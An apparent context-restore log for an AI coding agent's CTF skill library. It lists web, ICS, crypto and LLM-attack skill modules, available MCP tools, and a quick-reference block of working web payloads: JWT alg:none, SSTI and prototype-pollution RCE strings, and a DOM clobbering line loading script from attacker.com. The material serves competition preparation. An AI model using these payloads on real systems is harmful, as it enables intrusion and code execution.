# Windsurf CTF Skill Upgrade Log
> **Read this file at the start of any session to restore full context.**
> Last updated: 2026-04-27

---

## How to Restore Context After Session Loss

```
@/home/kali/Desktop/.windsurf/SKILL_UPGRADE_LOG.md
```

Or ask: "อ่าน SKILL_UPGRADE_LOG.md และ restore context"

---

## Skill Directory Structure

```
/home/kali/Desktop/.windsurf/skills/
├── solve-challenge/       ← Master orchestrator / router
├── ctf-web/               ← Web exploitation (MAIN — heavily upgraded)
│   ├── ct-auth/           ← JWT, OAuth, 2FA, CAPTCHA (20 files)
│   ├── ct-blockchain/     ← Smart contract, ECDSA, storage slots (4 files)
│   ├── ct-client-side/    ← Prototype Pollution, DOM Clobbering, CSS Inj, CSTI (4 files) [Phase 4]
│   ├── ct-cve/            ← CVE PoC generator, NVD lookup tool (3 files) [Phase 3]
│   ├── ct-injection/      ← SQLi, SSTI, XXE, OS Command, NoSQL (15 files)
│   └── ct-server-side/    ← SSRF, LFI, File Upload, Deserialization, HTTP Smuggling (19 files)
├── ctf-crypto/            ← RSA, AES, ECC, lattice, PRNG (full)
├── ctf-forensics/
│   └── ct-dfir/           ← EVTX, NTLM extraction, MFT timeline [Phase 1]
├── ctf-ai-ml/
│   └── ct-llm-owasp/      ← OWASP LLM01-10, MCP Tool Abuse RCE [Phase 1]
├── ctf-ics/               ← Modbus/ENIP/S7/OPC-UA/BACnet (heavily upgraded)
├── ctf-misc/
│   └── programming/       ← algorithms.py + dp_patterns.md [Phase 5]
├── ctf-pwn/               ← Binary exploitation
├── ctf-reverse/           ← Reverse engineering
└── ctf-osint/             ← OSINT techniques
```

---

## Upgrade History

### Phase 1 — Transilience Import (Web + Forensics + AI-ML)
**Source:** `/home/kali/Desktop/communitytools/`

- `ctf-web/ct-injection/` — SQLi deep, NoSQL, SSTI all engines, XXE, OS Command (15 files)
- `ctf-web/ct-server-side/` — Path traversal, File upload bypass, HTTP smuggling, SSRF, Deserialization (19 files)
- `ctf-web/ct-auth/` — JWT (40KB), OAuth (36KB), 2FA bypass, CAPTCHA, ADFS (20 files)
- `ctf-forensics/ct-dfir/` — Windows EVTX parsing, NTLM extraction from PCAP, MFT/Prefetch timeline (3 files)
- `ctf-ai-ml/ct-llm-owasp/` — OWASP LLM01–10 complete, MCP Tool Abuse RCE pattern ports 6274/3000 (10 files)

### Phase 2 — Blockchain Security
**Source:** Transilience communitytools

- `ctf-web/ct-blockchain/` — delegatecall storage abuse, CREATE/CREATE2 nonce prediction, ECDSA malleability (4 files)

### Phase 3 — CVE PoC Generator
**Source:** Transilience `skills/cve-poc-generator/`

- `ctf-web/ct-cve/cve-ctf-quickstart.md` — 7-step CTF CVE workflow
- `ctf-web/ct-cve/poc-methodology.md` — Full NVD API methodology
- `ctf-web/ct-cve/cve_lookup.py` — One-shot CLI: NVD lookup + searchsploit + PoC links
- **Key shortcut:** Recent CVE → `https://github.com/<creator>?tab=repositories&q=CVE`

### Phase 4 — Client-Side Attacks
**Source:** pwnosec/CTF-Cheatsheet (extracted + enhanced)

- `ctf-web/ct-client-side/prototype-pollution.md` — jQuery/Lodash CVEs, PP→RCE (ejs), gadget chains
- `ctf-web/ct-client-side/dom-clobbering.md` — HTMLCollection 2-level, DOMPurify bypass, real CTF examples
- `ctf-web/ct-client-side/css-injection.md` — CSRF token exfil, RPO, font-face unicode-range
- `ctf-web/ct-client-side/csti.md` — AngularJS 1.0-1.6+ sandbox escapes, Vue.js, Handlebars RCE

### Phase 5 — Programming (CTF Competitive)
**Source:** PyRival algebra/ + TheAlgorithms/Python DP

- `ctf-misc/programming/algorithms.py` — Added number theory section (12 functions + FenwickTree):
  - `gcd`, `extended_gcd`, `lcm`, `modinv`
  - `is_prime` (Miller-Rabin, exact ≤ 3.3×10²⁴)
  - `prime_list` (wheel sieve), `euler_phi_sieve`
  - `chinese_remainder`, `composite_crt` (arbitrary moduli)
  - `prime_factors` (Pollard-Rho, O(n^1/4))
  - `discrete_log` (BSGS), `mod_sqrt` (Tonelli-Shanks)
  - `primitive_root`, `FenwickTree` (BIT)
- `ctf-misc/programming/dp_patterns.md` — 8 DP patterns with complexity table:
  - Knapsack (0/1 + Unbounded), LCS, LIS O(N log N), Edit Distance
  - Bitmask DP, Interval DP, Floyd-Warshall, Digit DP

---

## ICS/OT Upgrades (separate track)

- `ctf-ics/SKILL.md` — MQTT hunting, S7 rack/slot auto-probe, ENIP CIP raw fallback
- `ctf-ics/tools/modbus/modbus_unit_map.py` — Unit ID ranking with ambiguity handling
- `ICS-Explotation-MCP/venv` — `pymodbus + asyncua + bacpypes3` installed
- BACnet/OPC-UA/S7comm full protocol support enabled

---

## Competition Assets

| File | Purpose |
|------|---------|
| `/home/kali/Desktop/.windsurf/tools/pre_match_passcheck.sh` | 6-check PassCheck script pre-exploit |
| `/home/kali/Desktop/.windsurf/RTAF_COC2026_MATCHDAY_RUNBOOK_ONEPAGE.md` | One-page laminated runbook |
| `/home/kali/Desktop/.windsurf/workflows/ctf-quick-start.md` | Fast triage + routing workflow |
| `/home/kali/Desktop/.windsurf/workflows/ics-ot-matchday-hardening.md` | ICS match-day hardening |

---

## MCP Servers Available

| MCP | Protocol/Use |
|-----|-------------|
| `ctf-solve` | Binary analysis, pwntools, hashcat, SQLmap |
| `ghidramcp` | Reverse engineering (Ghidra decompiler) |
| `gtfobins` | GTFOBins privilege escalation lookup |
| `ics-exploitation-canary` | Modbus, ENIP, S7, OPC-UA, BACnet |
| `pentest-mcp` | tmux sessions, interactive shells, file transfer |
| `sharkmcp` | PCAP analysis (tshark) |
| `wiremcp` | Live packet capture + threat check |

---

## Key CTF Patterns (Quick Reference)

### Web Track
```
JWT alg:none     → header {"alg":"none"} + empty sig
JWT weak secret  → hashcat -m 16500 jwt.txt rockyou.txt
PP detect        → POST {"__proto__":{"test":"pp"}} → GET check
PP→RCE (ejs)    → {"__proto__":{"outputFunctionName":"x;require('child_process').exec('id');//"}}
SSTI Jinja2     → {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
AngularJS 1.6+  → {{constructor.constructor('alert(1)')()}}
DOM Clobber     → <a id=config></a><a id=config name=key href="//attacker.com/x.js"></a>
```

### Programming Track
```python
from algorithms import modinv, chinese_remainder, prime_factors, discrete_log, mod_sqrt
# CRT: x = a[i] mod p[i]   → chinese_remainder([a0,a1], [p0,p1])
# Factor: prime_factors(n)  → Counter({p: exp, ...})
# ModInv: modinv(a, m)      → a^-1 mod m
# BSGS: discrete_log(g,h,p) → x s.t. g^x ≡ h (mod p)
```

### Flag Hunt Regex
```
/(?:coc2026|flag|ctf|rtaf|f1a9|fl4g)\{.*?\}|\{[a-fA-F0-9]{32}\}|\b[a-fA-F0-9]{32}\b/i
```

### Output Format
```
[FLAG]  <raw_flag>
[CLEAN] <sanitized_flag>
[METHOD] <1-line command>
```
